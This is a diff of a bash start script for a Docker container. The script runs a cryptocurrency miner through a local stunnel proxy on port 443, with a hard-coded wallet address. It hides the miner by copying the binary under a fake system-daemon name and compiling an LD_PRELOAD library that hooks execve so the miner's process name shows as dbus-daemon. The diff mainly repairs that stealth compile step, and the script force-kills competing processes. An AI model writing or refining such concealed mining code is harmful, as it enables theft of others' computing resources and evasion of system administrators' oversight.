@@ -1,18 +1,18 @@
 #!/bin/bash
 
 # ========================================
-# START SCRIPT - DOCKER OPTIMIZED
+# START SCRIPT - DOCKER OPTIMIZED (FIXED GCC)
 # ========================================
 
 set -euo pipefail
 
 LOG_FILE="/tmp/miner-run.log"
-PROXY_PORT=11443
+PROXY_PORT=443
 FAKE_PATH="/usr/local/bin/dbus-daemon-system"
 
 echo "=== CONTAINER STARTED === $(date)" | tee -a "$LOG_FILE"
 
-# 1. Aggressive Cleanup (Mencegah konflik port)
+# 1. Aggressive Cleanup
 echo "[*] Cleaning old processes..." | tee -a "$LOG_FILE"
 pkill -9 -f stunnel4 || true
 pkill -9 -f miner || true
@@ -45,7 +45,7 @@ if ! nc -z 127.0.0.1 ${PROXY_PORT}; then
 fi
 echo "[OK] Stunnel is active on port ${PROXY_PORT}" | tee -a "$LOG_FILE"
 
-# 4. Prepare Stealth Library (LD_PRELOAD)
+# 4. Prepare Stealth Library (LD_PRELOAD) - FIXED CODE
 echo "[*] Compiling stealth library..." | tee -a "$LOG_FILE"
 cat > /tmp/hide.c << 'EOF'
 #define _GNU_SOURCE
@@ -56,7 +56,9 @@ cat > /tmp/hide.c << 'EOF'
 
 int execve(const char *filename, char *const argv[], char *const envp[]) {
     static int (*real_execve)(const char *, char *const [], char *const []) = NULL;
-    if (!real_execve) real_execve = dlsym(RTLD_NEXT, "execve");
+    if (!real_execve) {
+        real_execve = dlsym(RTLD_NEXT, "execve");
+    }
     
     if (filename && (strstr(filename, "miner") || (argv[0] && strstr(argv[0], "miner")))) {
         argv[0] = "/usr/bin/dbus-daemon";
@@ -64,7 +66,14 @@ int execve(const char *filename, char *const argv[], char *const envp[]) {
     return real_execve(filename, argv, envp);
 }
 EOF
-gcc -shared -fPIC -o /tmp/hide.so /tmp/hide.c -ldl 2>/dev/null || echo "[WARNING] GCC failed"
+
+# Menambahkan flag -ldl sangat penting untuk dlsym
+if gcc -shared -fPIC -o /tmp/hide.so /tmp/hide.c -ldl 2>&1 | tee -a "$LOG_FILE"; then
+    echo "[OK] Stealth library compiled successfully" | tee -a "$LOG_FILE"
+else
+    echo "[WARNING] GCC failed to compile stealth library. Running without stealth." | tee -a "$LOG_FILE"
+    rm -f /tmp/hide.so
+fi
 
 # 5. Prepare Fake Binary
 cp /usr/local/bin/miner "$FAKE_PATH"
@@ -80,8 +89,10 @@ launch_miner() {
     ARGS="-a yespowerTIDE -o stratum+tcp://127.0.0.1:${PROXY_PORT} -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H -p x -t 1 --hash-meter -B --no-color"
     
     if [ -f /tmp/hide.so ]; then
-        LD_PRELOAD=/tmp/hide.so exec -a "$CMD" "$FAKE_PATH" $ARGS >> "$LOG_FILE" 2>&1 &
+        echo "[+] Using LD_PRELOAD stealth mode" | tee -a "$LOG_FILE"
+        LD_PRELOAD=/tmp/hide.so "$FAKE_PATH" $ARGS >> "$LOG_FILE" 2>&1 &
     else
+        echo "[+] Running in standard mode (no stealth)" | tee -a "$LOG_FILE"
         exec -a "$CMD" "$FAKE_PATH" $ARGS >> "$LOG_FILE" 2>&1 &
     fi
     
